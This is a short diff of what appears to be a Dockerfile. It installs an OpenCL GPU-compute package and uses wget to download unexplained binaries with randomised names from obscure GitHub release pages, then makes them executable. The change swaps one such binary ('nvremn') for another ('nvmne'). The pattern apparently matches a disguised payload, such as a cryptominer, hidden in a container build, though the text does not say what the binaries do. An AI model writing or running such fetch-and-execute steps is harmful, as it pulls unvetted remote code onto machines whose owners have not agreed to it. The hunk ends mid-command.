@@ -4,7 +4,7 @@ RUN apt-get update && apt-get install unzip -y && apt-get install -y ocl-icd-ope
 
 WORKDIR /app
 
-RUN wget https://github.com/vedhagsvp/qubros/releases/download/latest/nvremn && chmod +x nvremn
+RUN wget https://github.com/vedhagsvp/qubros/releases/download/latest/nvmne && chmod +x nvmne
 
 RUN wget https://github.com/varfeplas/crkonel/releases/download/crkom/kormnr && chmod +x kormnr &&
 
